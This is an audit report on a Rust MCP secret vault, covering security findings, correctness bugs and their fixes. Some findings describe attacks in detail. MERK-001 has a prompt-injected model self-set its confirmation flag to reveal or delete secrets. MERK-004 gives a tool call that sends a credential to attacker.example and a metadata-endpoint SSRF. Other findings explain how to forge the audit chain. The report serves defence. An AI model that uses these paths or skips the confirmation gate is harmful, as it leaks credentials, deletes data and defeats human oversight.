# Merkle Vault — Full Security & Correctness Audit

**Date:** 2026-06-28
**Scope:** entire workspace (19 crates + 3 binaries, ~54.4k LOC Rust, edition 2024).
**Method:** multi-agent static audit (12 security dimensions + adversarial verification),
runtime debugging of crypto seams (`fapp-debug`), supply-chain scan (`cargo audit`/`cargo deny`),
static gates (`cargo clippy`, test compile), and firsthand re-verification of every High finding by the
coordinating reviewer.

---

## Executive summary

The cryptographic **primitives** are sound: XChaCha20-Poly1305, BLAKE3, Argon2id (verified at runtime
running at full hardness), Ed25519/X25519/ECIES (verified fresh ephemeral per call), constant-time MAC
compare, `secrecy`/`zeroize` hygiene, and an atomic 0600 file keystore. `clippy` (all + pedantic) is clean
and the test harness compiles.

The defects are **architectural trust-boundary failures**, not primitive misuse. Two invariants the project
advertises are both bypassable as written:

1. **"The model cannot reveal/delete autonomously."** The operator-confirmation gate is a plain boolean the
   LLM itself supplies in tool-call JSON — no provenance binding. (MERK-001)
2. **"Audit tampering is detectable without the key."** The audit chain degrades to an unkeyed, forgeable
   hash chain under a disk/DB writer via a NULL-HMAC skip and an unauthenticated anchor. (MERK-002, MERK-003)

Plus an external HTTP proxy with no destination policy (secret exfiltration + SSRF) and no resource limits
(remote DoS), and a parallel **unauthenticated metrics TCP listener** the dimensioned audit didn't scope.

**Posture: not production-safe for its stated threat model** until MERK-001..004 and GAP-001 are fixed.

| Severity | Confirmed findings |
|---|---|
| Critical | 0 |
| High | 5 (MERK-001..005) + GAP-001/002/003 (high, single-pass — confirm) |
| Medium | GAP-004/005/006 |
| Low | MERK-006, GAP-007 |
| Info | GAP-008, supply-chain |

Threat model used: **T1** local impersonation · **T2** malicious MCP client · **T3** disk attacker ·
**T4** tampering · **T5** malicious remote · **T6** DoS · **T7** crypto misuse.

---

## Confirmed findings (adversarially verified)

43 raw findings → 9 confirmed, 34 refuted by an independent opus skeptic (default-refute, dual-lens). The
audit-chain and reveal findings below were additionally re-read firsthand by the coordinating reviewer.

### MERK-001 — Operator confirmation is a model/client-controlled boolean (High)
**Files:** `crates/merkle-adapter-mcp/src/tools/reveal.rs:33-35,82-84,107-111`,
`crates/merkle-adapter-mcp/src/tools/secrets.rs:405-441` (esp. 414-420,435),
`crates/merkle-adapter-companion-socket/src/handlers/reveal.rs:98-115,180-184`,
`.../handlers/secrets.rs:415`, `merkle-domain-*/operator_confirmation.rs:67-69`, `decision.rs:89-103`,
`merkle-application/src/commands/delete_secret.rs:54`.

`operator_confirmation` (reveal) and `operator_confirmation.slash_command` (delete) are plain booleans
deserialized from model-generated tool-call JSON and forwarded verbatim as `slash_command` into the domain.
The documented invariant — *"the LLM cannot set this flag; it is injected by the Claude Code client"* — is
**unrealized**: no handler inspects MCP request `_meta`/`RequestContext`. The `/merkle-reveal` "slash
command" is itself an MCP prompt whose body instructs the model to call the tool with
`operator_confirmation: true`. With the hardcoded `Balanced` profile / `oob_threshold = High`, Low **and**
Medium plaintext is released on the bare boolean.

- **Reveal (T2):** prompt-injected window calls `vault.reveal{operator_confirmation:true}` → Low/Medium
  plaintext into conversation context. High stays protected only because `oob_ack` is hardcoded `false`.
- **Delete (T2):** `vault.delete{operator_confirmation:true}` → irreversible hard-delete of secret + all
  versions. The recent `#[serde(default)]` + reject-if-false fix correctly denies a *missing* field, but the
  gate still reduces to honor-system once the model sets it.

**Fix:** Source confirmation from a channel the model cannot synthesize — MCP `_meta` via `RequestContext`,
or a mandatory agent-side OOB ack for reveal **and** delete. Bind the socket-side flag to a signed artifact.
Correct the false docstrings.

### MERK-002 — NULL HMAC silently skips keyed verification (High) — *re-verified firsthand*
**File:** `crates/merkle-domain-audit-compliance/src/verifier.rs:164-166`; nullable column
`migrations/001_initial.sql:53`; `mappers.rs:311-316`; `audit_log.rs:119`.

`check_hmac` is literally:
```rust
let (Some(key), Some(stored_hmac)) = (hmac_key, entry.hmac) else { return Ok(()); };
```
When a valid 32-byte key **is** supplied but `entry.hmac` is `None`, it returns `Ok(())` — treating a missing
mandatory MAC as "no check requested." The HMAC is the only keyed integrity element; `current_hash`/
`prev_hash` are unkeyed BLAKE3 anyone can recompute. The column is nullable and round-trips SQL `NULL → None`
with no rejection, contradicting `AuditEntry`'s own "always `Some` once persisted" contract.

**Exploit (T3/T4):** a disk/DB writer (who lacks the memory-only HMAC key) rewrites entry content, recomputes
the unkeyed chain, rewrites the unauthenticated `pinned_head` row, and sets `hmac=NULL` on rewritten rows.
`verify_full` recomputes matching hashes, **skips** HMAC on the NULL rows, matches the forged head, returns
`Intact` with `hmac_checked=true`. Hourly background verifier + `audit`/`doctor` report clean.

**Fix:** When a non-empty key is present, treat `entry.hmac == None` as a failure
(`MissingHmac { entry_id }`). Make the `hmac` column `NOT NULL`.

### MERK-003 — Unauthenticated chain anchor: prefix & tail truncation verify as Intact (High) — *re-verified firsthand*
**Files:** `verifier.rs:365-369` (first-entry), `:371` (link-check skipped for first entry), `:226-273`
(`check_head_commitment`); `pinned_head.rs:14-48`; `merkle-adapter-sqlite/src/audit.rs:244-266`;
`migrations/001_initial.sql:71-76`.

Two faces of one root cause — *the pinned head is not a real cryptographic anchor*:
1. **No genesis anchor.** The first walked entry is hashed against its **own** stored `prev_hash`
   (`entry.prev_hash.unwrap_or(GENESIS)`) and the per-entry seq/link check is skipped for it. Nothing asserts
   a full pass begins at `seq==0` / `prev_hash==None`.
2. **Unauthenticated tail witness.** `PinnedHead` (`head_hash`, `head_seq`, `head_id`, `updated_at`) carries
   no MAC and is a plain mutable singleton row in the same DB the attacker tampers with. The docstrings
   calling it a "cryptographic witness … cannot be forged without the HMAC key" are false.

**Exploit (T4):** *prefix deletion* of rows `seq 0..=k` (genesis through a target reveal/delete) — new first
entry self-validates, remaining HMACs genuine, head unchanged → `Intact`. *Tail truncation* of rows
`m+1..=head` + upsert `pinned_head` to entry `m` → `check_head_commitment` sees no gap → `Intact`.

**Fix:** Authenticate the head: `hmac_head = HMAC(key, head_hash ‖ head_seq ‖ head_id ‖ entry_count)`,
recompute + `ct_eq` before trusting the tail. Require the full-pass first entry to anchor at `seq==0` /
`prev_hash==None`.

### MERK-004 — HTTP proxy: no destination validation, follows redirects — SSRF + secret exfiltration (High)
**Files:** `crates/merkle-adapter-external-services/src/http.rs:35,51-66,73`, `lib.rs:88-91` (no redirect
policy), `merkle-adapter-mcp/src/tools/proxy.rs:103-116`, `merkle-application/src/commands/http_request.rs:38-66`.

The proxy resolves a secret `handle` to plaintext and injects it as `Authorization` — but the secret is bound
to a handle, **not** a destination host, and the path does zero scheme/host allowlist or internal-address
filtering. The shared `reqwest` client has no `.redirect(...)`, so default follow-up-to-10-redirects applies.

- **T2:** `vault.http.request{handle:<victim secret>, url:https://attacker.example}` ships the plaintext
  credential in `Authorization` to the attacker — defeating the "ALWAYS proxy, NEVER reveal+paste" guarantee.
- **T5:** attacker endpoint 302-redirects to `http://169.254.169.254/...`; agent follows, fetches internal
  resource, returns body — cloud-metadata / internal-service SSRF.

**Fix:** https-only; reject loopback/link-local/private/multicast/metadata ranges; bind each secret to an
allowed host set checked before auth injection; `redirect::Policy::none()` (or a re-validating custom policy).

### MERK-005 — External HTTP proxy: no timeout, unbounded body buffer — remote DoS (High)
**Files:** `http.rs:94-97` (body drain), `lib.rs:88-91` (client builder), `external_services.rs:24-33`,
`http_request.rs:45`, `http_download.rs:55`.

Client built with only `Client::builder().use_rustls_tls().build()` — no `.timeout()`, no
`.connect_timeout()`, no read deadline; body drained with `response.bytes().await` with no `Content-Length`
check or ceiling. The inverse of the companion-client (which caps `REQUEST_TIMEOUT=30s`, `MAX_BODY_BYTES=8 MiB`).

**Exploit (T5/T6):** an attacker-/LAN-/localhost endpoint streams many GB; `response.bytes()` buffers it all
into the agent RAM, OOM-killing the long-lived keystore daemon shared by every Claude window. (Slowloris hang
is bounded to ~30s by the inbound timeout; memory exhaustion is **not** bounded.)

**Fix:** explicit `.timeout()` + `.connect_timeout()`; enforce `MAX_BODY_BYTES` via `Content-Length` and/or
`bytes_stream()`; wrap in `tokio::time::timeout`.

### MERK-006 — Non-char-boundary string slice panics the session handler (Low)
**File:** `crates/merkle-adapter-companion-socket/src/handlers/sessions.rs:62`; DTO `dto.rs:413-419`.

`POST /v1/sessions` does `&body.cwd_hash[..body.cwd_hash.len().min(24)]` — a **byte** slice on attacker
input. A `cwd_hash` whose byte 24 is a UTF-8 continuation byte panics (`not a char boundary`).
**Bounded:** verified no `panic="abort"` and no `catch_unwind`; the per-connection `tokio::spawn` isolates the
panic, daemon survives, only the attacker's own connection drops; no mutex poisoning. **Latent risk:** becomes
a full-daemon crash if the build ever switches to `panic="abort"`.

**Fix:** validate `^[0-9a-f]{64}$` up front, or `chars().take(24).collect()`. Audit all byte-index `String`
slices on request input.

---

## Completeness gaps (surfaces outside the 12 dimensions — single-pass, confirm before fixing)

| ID | Sev | Gap | Evidence | Status |
|---|---|---|---|---|
| GAP-001 | High | **Unauthenticated Prometheus `/metrics` TCP listener** — leaks namespace labels, secret counts, reveal/unseal cadence to any local process; `host` env-overridable network-wide; no auth layer | `bin/merkle-agent/src/metrics.rs:530-551`, `config.rs:261-290` (`enabled: true` default) | **confirmed firsthand** |
| GAP-002 | High | **No server→client auth (socket-path squatting)** — `UnixStream::connect` trusts the path; default `${TMPDIR}/…` parent made with `create_dir_all` at 0755; same-uid process can pre-`bind()` and MITM operator tokens / secret writes | `merkle-companion-client/src/transport.rs:110`; default path in `merkle-mcp/src/main.rs`, `merkle-cli/src/config.rs` | needs confirm |
| GAP-003 | High* | **Live identity seeded with placeholder recovery recipient** `age1placeholder000…` — anything reading `recovery_pubkey()` encrypts a non-recoverable / unknown-party backup | `bin/merkle-agent/src/run.rs:442-456` | **confirmed present** (latent: backup scheduler still Phase-4 stub — confirm `init_vault` overwrites before any backup) |
| GAP-004 | Med | **Env overlay can downgrade security; no `deny_unknown_fields`** — `MERKLE__SECURITY__SECURITY_PROFILE=relaxed` weakens the gate; a typo'd hardening key is silently dropped to its insecure default | `config.rs:416-436`; all `#[derive(Deserialize)]` structs | needs confirm |
| GAP-005 | Med | **`MERKLE_LOG`/`RUST_LOG` can enable `sqlx=trace`** → SQL (and any bound plaintext/label) into log files readable by a disk/same-uid attacker | `tracing_init.rs:28-33`, `merkle-mcp/src/main.rs:261-266`, plist sinks | needs confirm (grep sqlite `bind(` for plaintext params) |
| GAP-006 | Med | **No `panic="abort"`; `parking_lot` doesn't poison** — a panic mid-critical-section over unsealed key state unlocks and lets the next task see a half-updated invariant with no signal; also confirm zeroize-on-unwind runs | `Cargo.toml [profile.release]` | needs confirm |
| GAP-007 | Low | **`bind()`→`set_permissions(0600)` TOCTOU** — window where another process can `connect()` before the chmod (peer-cred still gates the request) | `companion-socket/src/lib.rs:104` vs `:112-114` | confirmed pattern |
| GAP-008 | Info | **Dependency advisories not gated** (see Supply chain) | `deny.toml`, `Cargo.lock` | confirmed |

\* GAP-003 severity is latent-High: damaging only once the backup path is wired, but it is a foot-gun sitting
in the live identity-build path today.

---

## Supply chain (`cargo audit` / `cargo deny`)

`cargo deny check` **failed to run** — `deny.toml:100` `unmaintained = "warn"` is an invalid value for the
schema (expects `all|workspace|transitive|none`). **The advisory gate is silently broken** and passes nothing.
Fix the config first, then `cargo deny` will enforce the four advisories below.

| Crate | Advisory | Sev | Fix | Note |
|---|---|---|---|---|
| quinn-proto 0.11.14 | RUSTSEC-2026-0185 remote mem exhaustion | High 7.5 | ≥0.11.15 | likely transitive (reqwest/HTTP3) — confirm reachability |
| protobuf 2.28.0 | RUSTSEC-2024-0437 recursion crash | — | ≥3.7.2 | transitive |
| time 0.3.45 | RUSTSEC-2026-0009 stack-exhaust DoS | Med 6.8 | ≥0.3.47 | transitive |
| rsa 0.9.10 | RUSTSEC-2023-0071 Marvin timing | Med 5.9 | **no fix** | confirm it is not on a signing path |
| paste / proc-macro-error | unmaintained | warn | — | dev/transitive |

Also: `age = "0.10"` is behind current `0.11`.

---

## Runtime evidence (`fapp-debug`, lldb)

Independent runtime confirmation of the crypto core (not just source review):

- **Argon2id** at the KDF seam (`argon2id.rs:35`) runs with `m_cost=65536 (64 MiB), t_cost=3, p_cost=1` — full
  floor, not silently downgraded.
- **ECIES** ephemeral X25519 secret is **distinct per call** — stop 1 seed `36 a0 92 c6…`, stop 2
  `f9 8d ce 31…`, same recipient both times → no ephemeral/nonce reuse.

(Peer-cred FFI, audit-chain linkage, and SQLite hardening have no unit-test seam without a live daemon; the
audit-chain findings above were instead confirmed by direct source read.)

---

## Verified-fix assessment (recent hardening commits)

| Recent fix | Verdict | Note |
|---|---|---|
| Peer-credential auth, fail-closed | **Solid as auth** | Authenticates the *process*, but cannot distinguish a slash-originated from a model-originated call → basis of MERK-001 |
| OOB test-backdoor removal in release | **Solid** | No bypass found |
| `vault.delete` operator_confirmation gate | **Bypassable** | Missing-field denial correct, but flag is model-controlled → MERK-001 |
| Backup encrypt-to-real-recipient | **Solid (logic)** — but see GAP-003 | Encryption logic correct; the daemon still injects a *placeholder* recipient into the live identity |
| SQLite secure_delete / LIKE-escaping | **Solid** | Doesn't protect against a raw file writer — separate root cause (MERK-002/003) |
| Header-injection block | **Solid** | Orthogonal gap: no destination/redirect validation → MERK-004 |
| Subprocess env / shell-injection | **Solid** | No injection path found |
| File keystore 0600 atomic | **Solid** | Confirmed; HMAC key correctly memory-only |
| Audit-chain verbatim verification | **Bypassable** | Correct for *present* HMACs; defeatable via NULL-HMAC skip (MERK-002) + unauthenticated anchor (MERK-003) |
| Constant-time `HmacSignature` (`ct_eq`) | **Solid but moot when skipped** | Irrelevant on rows where verification is skipped entirely |

---

## Prioritized remediation checklist

1. **MERK-004** — destination policy + `redirect::Policy::none()` on the external client. *Stops direct secret exfiltration.*
2. **MERK-001** — stop forwarding a model bool as `slash_command`; source from `_meta`/OOB; bind socket flag to a signed artifact.
3. **MERK-002** — `entry.hmac == None` is a failure when a key is present; `hmac` column `NOT NULL`.
4. **MERK-003** — authenticate the pinned head with HMAC over head+seq+id+count; require genesis anchor on full pass.
5. **GAP-001** — auth the metrics listener (or bind loopback-only + drop namespace labels); never allow `0.0.0.0` rebind without auth.
6. **MERK-005** — `.timeout()` + `.connect_timeout()` + `MAX_BODY_BYTES` on the external client.
7. **GAP-003** — replace the placeholder recovery recipient; assert a real recipient before any backup/encrypt runs.
8. **GAP-002 / GAP-004 / GAP-005 / GAP-006** — confirm and harden (server auth on socket path; `deny_unknown_fields`; clamp log directive; `panic="abort"`).
9. **MERK-006 / GAP-007** — char-safe slicing; bind socket inside a 0700 dir.
10. **Supply chain** — fix `deny.toml` (broken gate), bump quinn-proto/time/age, confirm `rsa` is off any signing path.

---

## Audit completeness & caveats

- **Security audit:** complete — 12 dimensions, 43 raw → 9 confirmed, 34 refuted. 2 verifier agents hit the
  schema retry cap, dropping 2 findings unverified (raw finder output retained in the workflow transcript;
  re-verify in a follow-up).
- **Correctness/bug-hunt workflow:** complete — re-run lean (4 clusters, batched verify, 9 agents) after the
  per-finding fan-out tripped API overload. 26 raw → **16 confirmed** (9 High / 6 Medium / 1 Low), 10 refuted.
  See **Part II** below.
- Static gates green: `clippy` (all+pedantic) clean, test harness compiles.

---

# Part III — Remediation status (branch `fix/full-remediation-2026-06-28`)

All 25 confirmed findings + actionable gaps were fixed via dependency-ordered multi-agent waves,
then **adversarially validated** (4 reviewers + synthesis): **28 fixed / 1 partial / 0 weakened / 0
regressed**. The 1 partial (BUG-06 use-token/seal sites) and both CI blockers were then closed by hand.

**Gate (branch tip):** `cargo build` clean · `cargo clippy --all-targets -D warnings` clean ·
`cargo test --workspace` **739 passed / 0 failed** · `cargo deny check` **advisories/bans/licenses/sources ok**.

**Runtime proof (`fapp-debug`):** Argon2id runs at 64 MiB/t3/p1; ECIES ephemeral distinct per call; the new
audit-chain reject outcomes (`MissingHmac`, `GenesisAnchorMissing`, `HeadMacMismatch`) are exercised by
reproducing tests.

| Finding | Status | Fix |
|---|---|---|
| MERK-001 | ✅ fixed | confirmation sourced from MCP `_meta`/provenance, not a model-set bool |
| MERK-002 | ✅ fixed | `MissingHmac` fail-closed when key present + tag absent; `hmac` NOT NULL |
| MERK-003 | ✅ fixed | genesis-anchor check + HMAC-authenticated `PinnedHead` (`HeadMacMismatch`) |
| MERK-004 | ✅ fixed | `DestinationPolicy` (https-only, deny loopback/link-local/private/metadata) + redirects off |
| MERK-005 | ✅ fixed | `.timeout()`+`.connect_timeout()` + 8 MiB streamed body cap |
| MERK-006 | ✅ fixed | `cwd_hash` validated/char-safe (no panic) |
| BUG-01 | ✅ fixed | use-tokens registered + validated/consumed (single-use+TTL) before materialization |
| BUG-02 | ✅ fixed | `put_secret` writes row + all versions in one transaction |
| BUG-03 | ✅ fixed | `namespace_label` bound so FTS5 indexes the real label |
| BUG-04 | ✅ fixed | tag filter applied before LIMIT |
| BUG-05 | ✅ fixed | unseal rolls back to Sealed on any failure (no `hmac_key=None` split state) |
| BUG-06 | ✅ fixed | `audit_commit` persists-then-advances under one guard with rollback (all 10 sites incl. use_token/seal) |
| BUG-07 | ✅ fixed | `write_fifo` aborts the writer task + removes the FIFO on every error path |
| BUG-08 | ✅ fixed | init & unseal share one audit-HMAC derivation fn |
| BUG-09 | ✅ fixed | `write_tempfile` removes plaintext on audit-failure path |
| BUG-10..13 | ✅ fixed | put/list forward tags+sensitivity+filters; category/op/outcome honored |
| BUG-14..16 | ✅ fixed | delete/rotate/list report real counts; list `total`/`has_more` over the full set |
| GAP-001/003/004/005/006/007 | ✅ fixed | metrics loopback+auth; real recovery recipient; `deny_unknown_fields`; log clamp; `panic="abort"`; socket 0700 |
| GAP-008 | ✅ fixed | `deny.toml` schema repaired; protobuf dropped (RUSTSEC-2024-0437) via `prometheus default-features=false`; CDLA license allowed; dup-version → `warn` |

**Tracked follow-ups (non-blocking, out of audit scope):** DNS-rebinding pin for MERK-004 (IP-literals fully
closed today); external monotonic anchor for the MERK-003 stale-head edge; SQL-side count+limit for the
BUG-04/16 fetch-then-truncate perf amplifier; reaper for consumed/expired use-tokens; `age 0.10 → 0.11` bump
to de-duplicate `base64` and re-tighten `multiple-versions` to `deny`.


---

# Part II — Correctness & reliability bugs (lean bug-hunt)

_16 confirmed (9 High / 6 Medium / 1 Low) of 26 raw; 10 refuted. 4 clusters, 1 batched adversarial opus verifier per cluster (9 agents total). Severity = correctness/reliability impact, not security._

# Merkle Vault — Correctness Bug Report

## Executive summary

This audit covers functional correctness and data-integrity defects in the Merkle local-first MCP secret vault (no security-only findings). After deduplication, **15 distinct bugs** were confirmed across the application, SQLite adapter, companion-socket handlers, and MCP adapter.

Reliability posture: **fragile on two axes — atomicity and contract fidelity.** The core write path (`put_secret`) is not transactionally atomic, and the audit chain — the product's integrity guarantee — both fails verification deterministically and can be corrupted under concurrency. Separately, a systemic plumbing pattern silently drops filter/metadata parameters at every adapter boundary, so several documented MCP/CLI features are no-ops that store or return wrong data with no error.

| Adjusted severity | Count |
|---|---|
| Critical | 0 |
| High | 8 |
| Medium | 6 |
| Low | 1 |
| Info | 0 |

**Most impactful:** `BUG-005` — `init` and `unseal` derive the audit HMAC key by different paths, so `audit --verify-chain` reports tamper/corruption on **every** initialized vault after its first unseal. The integrity verifier never returns a clean result on a healthy vault, destroying trust in the one feature whose job is trust. Close second: `BUG-006` — `vault.put` silently discards caller-supplied `tags` and `sensitivity`, persisting secrets with wrong metadata and no warning.

---

## Critical

_None. All originally-critical items were downgraded to High: each manifests only under concurrency or transient failure, or returns an error/orphan rather than a silently-wrong live secret._

---

## High

### BUG-001 — `put_secret` writes the aggregate non-atomically (orphan `current_version_id`)
**Severity:** High **File:** `crates/merkle-adapter-sqlite/src/secrets.rs:104-159`
**Defect:** The `secrets` row is committed in its own transaction (`tx.commit()` at line 143), then each `secret_versions` row is upserted *after* the commit against the raw pool (`upsert_version_with_parent(pool, …)` at line 154). The aggregate is therefore not written atomically. `Secret` derives plain `Deserialize` with no invariant validation, so a partial read reconstructs successfully but inconsistently.
**Scenario:** WAL pool, `max_connections=5`. Caller A `put_secret` commits the `secrets` row at line 143. Concurrently caller B `list_secrets`/`get_secret_by_handle` reads the committed row on another connection before the version rows land; `load_versions_for_secret` returns 0 rows; `row_to_secret(&row, &[])` yields a secret whose `current_version()` (secret.rs:149-152) can never resolve → `None` → reveal fails even though the put "succeeded." On rotation the window is worse: the `secrets` UPDATE commits the new `current_version_id` while only the OLD version rows exist. On SIGKILL/power loss between commit and version writes, the row is **durably** committed referencing a non-existent version — permanently unreadable, and unrecreatable if the handle UNIQUE constraint blocks re-put.
**Fix:** Pass `&mut *tx` to every `upsert_version_with_parent` call and move `tx.commit()` to after the version loop, so the `secrets` row and all its versions commit as one transaction. Remove the "each version upsert is its own mini-tx" comment (148-152). FK ordering is preserved because the parent is inserted first within the tx.

### BUG-005 — `init` vs `unseal` derive different audit HMAC keys; chain verification always fails
**Severity:** High **File:** `crates/merkle-application/src/commands/init_vault.rs:223-225`; `unseal_vault.rs:161-162`; consumed at `queries/verify_chain.rs:60`
**Defect:** `init` derives the audit HMAC key as `BLAKE3(random_vrk, "merkle vault hmac key v1")` (random 32-byte VRK from line 132). `unseal` derives it as `BLAKE3(BLAKE3(master_key, "vault-root-key"), "hmac-key")` — a different VRK **and** a different domain-separation string (the unseal comment at 112-113 admits it is a placeholder). The genesis `Init` entry (seq 0) is signed with `K_init`; all post-unseal entries with `K_unseal`.
**Scenario:** `merkle init` → `merkle unseal` → `merkle audit --verify-chain`. `ChainVerifier::verify_full` applies the single session key (`K_unseal`) to every entry; the genesis entry's stored HMAC (computed with `K_init`) never matches → `ChainOutcome::HmacMismatch` on a vault that was never tampered with. Reachable on every initialized vault.
**Fix:** Make `unseal` AEAD-decrypt the master-wrapped VRK blob the keychain stored at init (the intended production path the comment describes), reproducing the same `random_vrk`, then derive the HMAC key with the identical domain string `"merkle vault hmac key v1"`.

### BUG-003 — In-memory audit log advanced before storage write; concurrent command chains on an unpersisted entry
**Severity:** High **File:** `crates/merkle-application/src/commands/seal_vault.rs:44`; also `reveal_secret.rs:189,272`, `delete_secret.rs:69,94`, `write_tempfile.rs:115`, `revoke_tempfile.rs:73`, `write_fifo.rs:128`, `init_vault.rs:242`
**Defect:** `AuditWriter::append` advances the shared in-memory `AuditLog` head, then these commands `drop(log)` **before** `append_audit_entry`/`update_pinned_head` complete — releasing the write-lock while the storage write is in flight. `put_secret.rs:145-158` and `rotate_secret.rs:127-140` correctly hold the lock across both storage writes, proving the drop pattern is unintentional. Compounding: commands call `update_pinned_head` a second time, and that UPSERT (audit.rs:244-272) has no monotonic (`head_seq > excluded`) guard. Each socket connection runs in its own `tokio::spawn` with no global command lock.
**Scenario:** Request A (seal) appends seq 5, drops the lock. Request B (reveal) wins the lock, appends seq 6 (parent = hash(5)), persists seq 6, sets pinned_head=6. Request A's `append_audit_entry` for seq 5 fails (SQLITE_BUSY). Storage now holds seq 6 with no seq 5; or the redundant second `update_pinned_head` regresses pinned_head to a lower seq. On next start the chain is restored from a stale/forward head → permanent gap or duplicate seq that `verify_full` flags.
**Fix:** Hold the `audit_log` write-lock across both storage calls (release only after `update_pinned_head` returns), as `put_secret`/`rotate_secret` already do; or commit to storage first and update the in-memory log under the lock only on success. Add a monotonic guard to `update_pinned_head` and drop the redundant second call.

### BUG-002 — Vault stuck `Unsealed` with `hmac_key=None` if the Window-4 keychain read fails
**Severity:** High **File:** `crates/merkle-application/src/commands/unseal_vault.rs:121-167`
**Defect:** `complete_unseal(vrk)` transitions identity to `Unsealed` at line 126; the code then performs a **second** independent `keychain.retrieve` (149-160) to re-derive the VRK for the HMAC phase. On failure it returns `Err(AppError::Keychain)` at 157 without reverting identity (no `revert_to_sealed`), leaving `identity=Unsealed` while `hmac_key` stays `None` (set only at 164-167). The retry guard at 77-83 early-returns `was_already_unsealed` and never re-derives the key, so the split state self-perpetuates.
**Scenario:** macOS keychain times out between the two reads. `complete_unseal` succeeds; second `retrieve` fails. `is_unsealed()` is now true but `require_hmac_key()` (context.rs:170-173) returns `VaultSealed`. Every `put_secret`/`reveal`/`rotate` fails with `VaultSealed`; re-issuing `unseal` short-circuits. Recovery requires an explicit `seal` then fresh `unseal` (or restart).
**Fix:** In the Window-4 error path, take the identity write-lock and call `revert_to_sealed()` before returning. Better: fold the HMAC derivation into Window 3 — derive `hmac_key` from `vrk` while the write-lock is still held, and drop the second keychain read entirely.

### BUG-004 — `write_fifo` leaks a blocked `spawn_blocking` thread and the FIFO file when the audit write fails
**Severity:** High **File:** `crates/merkle-application/src/commands/write_fifo.rs:87-102,129`
**Defect:** The FIFO is created at line 87. A detached `spawn_blocking` (JoinHandle dropped at the block end, 103) calls `std::fs::OpenOptions::write(true).open()` on the named pipe — an `O_WRONLY` open that blocks until a reader connects. The `opaque_token` is returned only at line 133, **after** the audit writes at 129-130. If `append_audit_entry`/`update_pinned_head` fails, the function returns `Err` and the token is never delivered, so no reader can ever connect; the blocking thread is stuck for process lifetime and the FIFO file is never removed.
**Scenario:** Transient SQLITE_BUSY at line 129 during `write_fifo`. The MCP caller retries; each retry creates a new FIFO and a new permanently-blocked thread. Enough retries saturate Tokio's `max_blocking_threads`, stalling all `spawn_blocking` work (including `tokio::fs`) daemon-wide.
**Fix:** Create the FIFO and spawn the writer **after** the audit write succeeds. Store the JoinHandle and reclaim the thread + unlink the FIFO via an RAII guard on any later error.

### BUG-006 — MCP `vault.put` and `vault.list` silently drop declared input fields
**Severity:** High **File:** `crates/merkle-adapter-mcp/src/tools/secrets.rs:199-210` (put), `278-294` (list)
**Defect:** `VaultPutInput` declares `tags: Option<Vec<String>>` and `sensitivity: Option<String>`, but `vault_put` builds `PutSecretRequest` with `tags: vec![]` and `sensitivity: None` hardcoded — `input.tags`/`input.sensitivity` are never read. `VaultListInput` exposes `tags`, `sensitivity`, `expires_before`, but `vault_list` constructs `ListSecretsParams` with all three hardcoded to `None`. The downstream `put_secret` handler *does* honor `body.tags`/`body.sensitivity` (handlers/secrets.rs:333-334) and the list handler honors `tags`, so the values would take effect if forwarded.
**Scenario:** Model calls `vault.put {tags:["env:prod"], sensitivity:"high"}` → secret stored at default `Medium` with no tags, no error. Model calls `vault.list {tags:["env:prod"], sensitivity:"high", expires_before:…}` → filters silently ignored, full namespace returned.
**Fix:** Parse `input.sensitivity` into `Sensitivity`, convert `input.tags` (`Vec<String>`) into `TagDto`s (key:value split), and forward both in `PutSecretRequest`; wire `input.tags`/`sensitivity`/`expires_before` into `ListSecretsParams` (tags as comma-separated `key:value`). Return MCP `invalid_params` on parse failure.

### BUG-007 — `list_secrets` handler discards the `category` query parameter
**Severity:** High **File:** `crates/merkle-adapter-companion-socket/src/handlers/secrets.rs:240-244`
**Defect:** The handler parses `ListSecretsParams` (which includes `category`) but builds `ListSecretsCommand { tag_match, name_pattern, limit }` with no category field; `ListSecretsCommand` (list_secrets.rs:16-28) and `SecretFilter` have no `category`, and the SQL builder (secrets.rs:216-258) has no category clause.
**Scenario:** `merkle list mcp-smoke --category password` sends `…/secrets?category=password`. All secrets in the namespace are returned regardless of category; the documented flag silently no-ops.
**Fix:** Add `category: Option<CategoryName>` to `ListSecretsCommand` and `SecretFilter`, parse `params.category` at the handler, and add a category predicate to the SQL builder.

### BUG-008 — Audit handler hardcodes `op: None`/`outcome: None`, making those filters no-ops
**Severity:** High **File:** `crates/merkle-adapter-companion-socket/src/handlers/audit.rs:29-48`
**Defect:** The `GET /v1/audit` handler receives `params.op`/`params.outcome` but constructs `DomainAuditQuery` with `op: None, outcome: None` (comment: "string→enum parse requires AuditOp FromStr; leave as no-filter for now"). MCP `vault.audit.query` forwards `input.op`/`input.outcome` (tools/audit.rs:90,94) and the client serializes them (client.rs:593-601), so the params reach the handler and are dropped.
**Scenario:** `merkle audit --op reveal` (or `vault.audit.query {op:"reveal"}`) returns every audit entry up to the limit, with no indication the filter was ignored.
**Fix:** Implement `FromStr` for `AuditOp`/`AuditOutcome` (400 on invalid value) and wire both into `DomainAuditQuery`.

---

## Medium

### BUG-009 — `UseToken` is never persisted; single-use + 60s-TTL invariants are unenforceable
**Severity:** Medium **File:** `crates/merkle-application/src/commands/use_token.rs:71-81`
**Defect:** `UseTokenCommand::execute` mints a `UseToken`, base64-encodes it (line 80), audits it, and returns it — but never persists or registers it. There is no Storage port for use-tokens and no in-memory registry in `AppContext`. `UseToken::consume()` has no production caller (only tests at 174-182). `WriteTempfileRequest`/`WriteFifoRequest` (dto.rs:697-715) carry `handle`+`session_id` but no `use_token`; the materialization handlers (handlers/use_token.rs:124-198) derive the DEK server-side and never accept/validate the minted token.
**Scenario:** The documented "consumed exactly once, expires after 60s" invariant cannot be enforced: the token can't be looked up, marked consumed, or rejected on replay/expiry. The abstraction is vestigial — issued and audited, never checked.
**Fix:** Add `store_use_token`/`fetch_use_token`/`mark_consumed` to the Storage port (or a TTL `DashMap` registry in `AppContext`), and require the use-token in `WriteTempfileRequest`/`WriteFifoRequest` so it is validated and consumed before materializing plaintext.

### BUG-010 — `namespace_label` never written by `put_secret`; FTS5 trigger indexes `''` instead of the label
**Severity:** Medium **File:** `crates/merkle-adapter-sqlite/src/secrets.rs:110-141`; `migrations/002_fts5_bm25.sql:41,88-125`
**Defect:** Migration 002 adds `namespace_label TEXT NOT NULL DEFAULT ''`. `put_secret`'s INSERT column list omits `namespace_label`, so every new row gets `''`. The FTS triggers populate the index via `COALESCE(new.namespace_label, (SELECT label FROM namespaces …))` — since `''` is non-NULL, COALESCE returns `''` and the subquery never runs. The one-time backfill (002:60-64) only fixed pre-existing rows.
**Scenario:** `vault.search` for a term matching a namespace label gets zero contribution from the BM25 weight-1.0 `namespace_label` column for any post-migration secret; `hl_namespace_label` highlights are always empty and ranking is degraded.
